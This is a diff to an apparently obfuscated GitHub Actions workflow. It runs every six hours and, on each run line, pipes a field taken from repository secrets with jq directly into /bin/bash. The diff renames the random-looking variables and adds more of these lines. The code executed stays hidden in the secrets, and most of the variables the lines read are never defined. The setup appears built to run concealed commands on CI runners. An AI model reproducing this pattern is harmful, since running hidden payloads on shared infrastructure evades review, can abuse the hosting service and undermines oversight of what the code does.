@@ -2,22 +2,28 @@ name: qiyuanjiao3812
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
+    - cron: '20 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qiyuanjiao3812
         env:
-          x214: ${{ secrets.x214 }}
+          jfd327: ${{ secrets.jfd327 }}
         run: |
-          echo $x214 | jq -r .mzsfj9020 | /bin/bash
-          echo $pd6 | jq -r .t1605 | /bin/bash
-          echo $pfrtt5725 | jq -r .yarr7 | /bin/bash
-          echo $gelld01 | jq -r .tk9493 | /bin/bash
-          echo $l0 | jq -r .gam4760 | /bin/bash
-          echo $grevk761 | jq -r .t24 | /bin/bash
-          echo $aqljp8 | jq -r .nojoo5829 | /bin/bash
+          echo $jfd327 | jq -r .u7 | /bin/bash
+          echo $gmu8638 | jq -r .gue06965 | /bin/bash
+          echo $j60 | jq -r .sfn12704 | /bin/bash
+          echo $ekv384 | jq -r .zoe00 | /bin/bash
+          echo $clmt8437 | jq -r .cbpot9159 | /bin/bash
+          echo $xrnw353 | jq -r .ct3292 | /bin/bash
+          echo $g13901 | jq -r .l0399 | /bin/bash
+          echo $vl8295 | jq -r .v3 | /bin/bash
+          echo $ocub83462 | jq -r .mk05654 | /bin/bash
+          echo $ewiz363 | jq -r .c964 | /bin/bash
+          echo $ivvmf46 | jq -r .hpu16331 | /bin/bash
+          echo $i532 | jq -r .wth260 | /bin/bash
+          echo $gi04027 | jq -r .b206 | /bin/bash
 
